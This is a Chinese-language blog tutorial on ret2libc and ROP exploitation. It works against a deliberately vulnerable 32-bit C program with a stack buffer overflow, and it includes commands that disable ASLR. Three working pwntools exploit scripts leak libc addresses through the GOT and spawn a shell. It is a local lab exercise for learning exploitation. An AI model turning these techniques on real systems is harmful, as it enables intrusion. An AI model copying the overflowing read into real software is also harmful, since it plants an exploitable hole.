---
layout: post
title: "ret2libc && ROP"
---

#### 0x00 准备 ####

环境： kali 2016 07    32位
工具： peda  pwntools

ps:对于该篇文章使用的技术，最重要的一点基础是，清楚函数的调用的栈布局，以及一些汇编指令的理解，清楚这些理解起来会很轻松。

漏洞程序：

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    void vul_func() {
        char msg[128];
        read(STDIN_FILENO, msg, 256);
    }

    int main(int argc, char \*argv[]) {
        vul_func();
        write(STDOUT_FILENO,"ROP test\n", 9); 
        return 0;
    }


运行:

    gcc -g -fno-stack-protector -o vul vul.c	#编译,这次我们开启了NX保护
    
    socat TCP4-LISTEN:10000,fork exec:./vul		# 通过网络监听加载vul

	  nc 127.0.0.1 1000		# 客户端连接

#### 0x01 ret2libc ####

首先关闭ASLR

	echo 0 > /proc/sys/kernel/randomized_va_space

该技术主要是通过将返回地址，覆盖成为目标函数(例如system函数)，并在后续将参数压栈(x86的架构都是这样传递参数，x64有所不同)，达到函数调用的功能，通过这样的技术可以绕过DEP(NX)防护机制

主要利用的原理



思路：

- 找到目标函数的地址
- 找到符合参数的内容
- 整合利用

通过`gdb`加载我们的漏洞程序`vul`, 在`main`函数下断点(`break main`)然后执行程序(`r`)，使用`print system`查到`system`函数地址，用同样的方法也查找到`exit`函数地址

![ret2libc]({{ '/images/201803/ret2libc_1_1.png' | prepend: site.baseurl }})

`system`函数的地址为`0xb7e3c850`,`exit`函数的地址为`0xb7e306c0`,继续查找`/bin/sh`这个是要作为`system`的参数进行传递的，使用`find /bin/sh`查找

![ret2libc]({{ '/images/201803/ret2libc_1_2.png' | prepend: site.baseurl }})

`/bin/sh`字符串的地址为`0xb7f5ae64`

再通过上一篇的文章，使用peda的`pattern_create`和`pattern_offset`来查找偏移位置

![ret2libc]({{ '/images/201803/ret2libc_1_3.png' | prepend: site.baseurl }})

偏移地址为140，此时开始构造exp脚本

<pre>#!/usr/bin/python

from pwn import *

#p = process('./vul')  #local
p = remote('127.0.0.1', 10000) #remote

# debug
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0], gdbscript='b \*0x804843f\nr\n')

payload_len = 140 
system_addr = 0xb7e3c850
exit_addr = 0xb7e306c0
str_addr = 0xb7f5ae64

payload =  "A"*payload_len + p32(system_addr) + p32(exit_addr) + p32(str_addr)

p.send(payload)

p.interactive()</pre>

脚本的核心为payload，下图为payload在栈中的布局

<pre>+---------------------+
|                     |
|                     |
|                     |
|                     |
|                     |
|                     |
+---------------------+
|      "A" * 140      |
|                     |
+---------------------+
|     system_addr     |  <----+ overwrite return_address
+---------------------+
|     exit_addr       |  <----+ exec exit function until system finish
+---------------------+
|      str_buf        |  <----+ system arg  "/bin/sh"
+---------------------+
|                     |
+---------------------+</pre>


运行测试

![ret2libc]({{ '/images/201803/ret2libc_1_4.png' | prepend: site.baseurl }})

#### 0x02 ROP ####

开启ASLR

	echo 2 > /proc/sys/kernel/randomized_va_space

在这里我们可以将ASLR保护打开，通过ROP来进行绕过，首先我们对比下开启ASLR后程序的区段到底有什么不同

![ret2libc]({{ '/images/201803/ret2libc_2_1.png' | prepend: site.baseurl }})

从图中可知，开启ASLR之后，程序本身的`image`映射的虚拟地址还是不变(程序本身定义的vul_func函数的地址还是固定的)的，但是`.so`的链接库(引用该库中的函数的地址在内存中都不是固定的)和`stack`地址是在不断变化的

ROP利用也分很多种，我们这里列出的思路主要是通过泄露出libc.so中函数的地址，再通过该函数在libc.so中的固定偏移，来继续计算libc.so此时在内存中加载的起始地址(也叫基地址)，然后就可以通过偏移计算出我们需要的函数的地址(system地址)以及我们需要的字符串(/bin/sh)，这样我们就可以通过前面的技术继续构造exp

需要获取的：

- libc.so中函数的地址
- 获取Libc.so中特定函数以及字符串的偏移

为了更好的理解利用过程，我们还需要认识一下`plt`和`got`。通过`objdump`的输出可以直观的看到plt项和got项，这里我们以`read`函数作为例子

![ret2libc]({{ '/images/201803/ret2libc_2_2.png' | prepend: site.baseurl }})

`0x080482e0`为`read@plt`,`0x8049730`(该地址指向的内容为调用函数在内存中的地址)为`read@.got.plt`，程序在运行过程中调用函数时，首先会跳转到`read@plt`的地方，再调用jmp跳转到调用函数所处的真实地址。

因此在这个漏洞程序中，通过将返回地址覆盖成为`write@plt`,再将`write@.got.plt`的地址作为参数，就可以读取到原始`write`函数此时在内存中的真实地址，后续通过偏移我们就可以计算出其他函数在内存中的地址，进行调用。

ps：`.plt`和`.got.plt`是在程序镜像中保存的，因此地址并不会改变。

首先测试看能否成功泄漏出write函数在内存中的地址，这里我们利用`pwntools`中的ELF对象中的symbols和got属性可以快速获取到目标文件中函数的`plt`和`got`，例如`ELF['./vul'].symbols['write']`和`ELF['./vul'].got['write']` 

<pre>#!/usr/bin/python

from pwn import *

#p = process('./vul')
p = remote('127.0.0.1', 10000)
elf = ELF('./vul')

payload_len = 140 
write_plt_addr = elf.symbols['write']
print "write plt addr " + hex(write_plt_addr)
#wirte_plt = 0x08048300
#write_got = 0x8049738
write_plt_got_addr = elf.got['write']
print "wirte plt got addr " + hex(write_plt_got_addr)
vul_func = 0x0804841b

payload = "A"\*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)
print payload

print "[\*] begin to leak write_addr function address...\n"
p.send(payload)

write_addr = u32(p.recv(4))
print "[+] the write_addr function address is " + hex(write_addr)

p.interactive()</pre>

这一层的`payload`，由于`write`函数需要传递2个参数，一个为需要获取的`write.got.plt`地址，还有一个需要输出的长度这里为`4`，栈布局如下：

<pre>+---------------------+
|                     |
|                     |
|                     |
+---------------------+
|       A * 140       |
+---------------------+
|  write_plt address  |  <----+ overwrite return address
+---------------------+
|  vul_func address   |  <----+ exec vul_func until write exec finish
+---------------------+
|          1          |  <----+ junk (optional)
+---------------------+
|  write got address  |  <----+ write function first argument
+---------------------+
|          4          |  <----+ write function second argument
+---------------------+
|                     |
+---------------------+</pre>

这里为什么把`vul_func`的地址放置到`write`函数的返回地址处，是为了后续再次通过`vul_func`的溢出漏洞，构造获取shell的`payload2`，这个脚本中的payload目标只是为了获取内存中的`write`函数地址，方便后续获取`system`函数地址



运行后，成功获取到write内存的地址

![ret2libc]({{ '/images/201803/ret2libc_2_3.png' | prepend: site.baseurl }})

接着我们需要通过获取到的`write`的内存地址，去分别计算`system_addr`和`/bin/sh`的地址，并将程序的执行返回到`vul_func`，再次发送我们新的`payload`, 这里我们还需要通过链接的.so文件去计算调用函数之间的偏移，通过ldd可以查看我们的程序链接了那些库文件

![ret2libc]({{ '/images/201803/ret2libc_2_4.png' | prepend: site.baseurl }})

同样可以利用ELF来计算之间的偏移，例如已知`write`的函数地址可以计算出`system`的地址

	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
	
	binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))	# /bin/sh字符串在内存中的地址

最终的利用脚本

<pre>#!/usr/bin/python

from pwn import *

#p = process('./vul')
p = remote('127.0.0.1', 10000)
elf = ELF('./vul')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

payload_len = 140 
write_plt_addr = elf.symbols['write']
print "write plt addr " + hex(write_plt_addr)
#wirte_plt = 0x08048300
#write_got = 0x8049738
write_plt_got_addr = elf.got['write']
print "wirte plt got addr " + hex(write_plt_got_addr)
vul_func = 0x0804841b

payload = "A"\*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)

print "[\*] begin to leak write_addr function address...\n"
p.send(payload)

write_addr = u32(p.recv(4))
print "[+] the write_addr function address is " + hex(write_addr)

system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print "[+] the system_addr function address is " + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print "[+] the /bin/sh str address is " + hex(binsh_addr)

print "[\*] begin to get shell...\n"
payload2 = "A"\*payload_len + p32(system_addr) + p32(vul_func) + p32(binsh_addr)

p.send(payload2)

p.interactive()</pre>

这个脚本中的payload2的内存布局就是传统的ret2libc的利用布局

运行之后成功拿到shell

![ret2libc]({{ '/images/201803/ret2libc_2_5.png' | prepend: site.baseurl }})

#### 0x03 总结 ####

通过本地的实践操作，终于是理清了这2个技术中的细节，也解决了不少疑惑，后续还会带来其他的漏洞类型以及利用技术，这篇介绍的rop算是一种，后续还会有其他类型的

KEEP GOING！！！


